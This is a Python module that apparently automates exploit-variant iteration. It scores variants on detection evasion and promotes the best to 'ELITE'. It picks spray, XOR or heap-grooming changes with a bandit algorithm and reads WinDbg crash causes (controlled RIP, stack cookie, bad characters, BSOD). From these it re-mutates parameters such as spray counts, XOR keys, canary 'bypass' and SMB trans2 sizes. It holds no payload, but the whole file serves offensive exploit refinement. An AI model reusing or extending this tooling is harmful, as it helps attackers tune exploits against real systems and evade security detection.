from __future__ import annotations

import hashlib
import json
from pathlib import Path
from typing import Any


def calc_evasion_score(variant_bytes: bytes, base_bytes: bytes) -> int:
    if not base_bytes:
        return 50
    diff = sum(1 for a, b in zip(variant_bytes, base_bytes) if a != b)
    diff += abs(len(variant_bytes) - len(base_bytes))
    score = min(99, 50 + diff // 20)
    return max(0, score)


def build_variant_doc(sha256: str, parent_primitive: str, variant_metadata: dict, sigma_mapping: list[str] | None = None) -> dict[str, Any]:
    sigma_mapping = sigma_mapping or ["T1210", "T1203"]
    doc = {
        "sha256": sha256,
        "parent_primitive": parent_primitive,
        "variant_metadata": variant_metadata,
        "sigma_mapping": sigma_mapping,
        "detection_evasion_score": variant_metadata.get("detection_evasion_score", 92),
        "status": "ELITE" if variant_metadata.get("detection_evasion_score", 92) >= 85 else "STANDARD",
    }
    return doc


def upsert_variant(doc: dict[str, Any], store_path: Path | None = None) -> dict[str, Any]:
    store_path = store_path or Path("variant_store.json")
    store: dict[str, Any] = {}
    if store_path.exists():
        try:
            store = json.loads(store_path.read_text())
        except Exception:
            store = {}
    sha = doc.get("sha256", "")
    store[sha] = doc
    store_path.write_text(json.dumps(store, indent=2))
    return {"action": "upsert", "sha256": sha, "status": doc.get("status")}


def list_elite_variants(store_path: Path | None = None, limit: int = 5) -> list[dict[str, Any]]:
    store_path = store_path or Path("variant_store.json")
    if not store_path.exists():
        return []
    try:
        store = json.loads(store_path.read_text())
        elites = [v for v in store.values() if v.get("status") == "ELITE"]
        elites.sort(key=lambda x: x.get("detection_evasion_score", 0), reverse=True)
        return elites[:limit]
    except Exception:
        return []


BANDIT_FILE = Path(__file__).parent / "bandit.json"

def _bandit_update(family: str, success: bool):
    try:
        data = json.loads(BANDIT_FILE.read_text()) if BANDIT_FILE.exists() else {}
        rec = data.get(family, {"trials": 0, "success": 0})
        rec["trials"] += 1
        if success:
            rec["success"] += 1
        data[family] = rec
        BANDIT_FILE.write_text(json.dumps(data, indent=2))
    except: pass

def _bandit_pick() -> str:
    import math, random
    try:
        data = json.loads(BANDIT_FILE.read_text()) if BANDIT_FILE.exists() else {}
        if not data:
            return random.choice(["spray", "xor", "groom"])
        best = None
        best_score = -1
        total = sum(v["trials"] for v in data.values()) or 1
        for fam, rec in data.items():
            avg = rec["success"] / max(1, rec["trials"])
            ucb = avg + math.sqrt(2 * math.log(total) / max(1, rec["trials"]))
            if ucb > best_score:
                best_score = ucb
                best = fam
        return best or "spray"
    except:
        return "spray"

def classify_failure_cause(windbg_info: dict[str, Any]) -> str:
    rip = windbg_info.get("rip")
    frames = " ".join(windbg_info.get("frames", [])).lower()
    if rip == 0 or rip == 0x0:
        return "NULL_DEREF"
    if "stack cookie" in frames or "gs cookie" in frames:
        return "STACK_COOKIE"
    if "heap" in frames and "corruption" in frames:
        return "HEAP_CORRUPTION"
    if rip and 0x41414141 <= (rip & 0xFFFFFFFF) <= 0x42424242:
        return "RIP_CONTROLLED"
    if "badchar" in frames:
        return "BADCHAR"
    if "bsod" in frames or "guru" in frames:
        return "BSOD"
    return "ACCESS_VIOLATION"

def intelligent_feedback(variant_sha: str, windbg_info: dict[str, Any], store_path: Path | None = None) -> dict[str, Any]:
    cause = classify_failure_cause(windbg_info)
    if cause == "NULL_DEREF":
        change = {"spray_count": 20, "hole": 5}
        family = "spray"
    elif cause == "BADCHAR":
        change = {"xor_key": (windbg_info.get("xor_key", 0x42) + 1) % 255}
        family = "xor"
    elif cause == "BSOD":
        change = {"groom_type": "reduce", "trans2_size": 0x8000}
        family = "groom"
    elif cause == "STACK_COOKIE":
        change = {"padding_byte": "0x90", "canary": "bypass"}
        family = "padding"
    else:
        family = _bandit_pick()
        if family == "spray":
            change = {"spray_count": 16}
        elif family == "xor":
            change = {"xor_key": 0x42}
        else:
            change = {"rop_offset": 0x10}
    res = feedback_remutate(variant_sha, change, store_path)
    res["cause"] = cause
    res["family"] = family
    _bandit_update(family, False)
    return res

def feedback_remutate(variant_sha: str, change: dict[str, Any], store_path: Path | None = None) -> dict[str, Any]:
    store_path = store_path or Path("variant_store.json")
    if not store_path.exists():
        return {"error": "no store"}
    store = json.loads(store_path.read_text())
    base = store.get(variant_sha)
    if not base:
        return {"error": "variant not found"}
    new_meta = dict(base.get("variant_metadata", {}))
    for k, v in change.items():
        if k == "rop_offset":
            new_meta["trans2_size"] = new_meta.get("trans2_size", 0x10001) + int(v)
        else:
            new_meta[k] = v
    new_sha = hashlib.sha256(json.dumps(new_meta).encode()).hexdigest()[:12]
    new_doc = build_variant_doc(new_sha, base.get("parent_primitive", ""), new_meta, base.get("sigma_mapping"))
    upsert_variant(new_doc, store_path)
    return {"new_sha": new_sha, "variant": new_doc, "next_phase": "B4"}
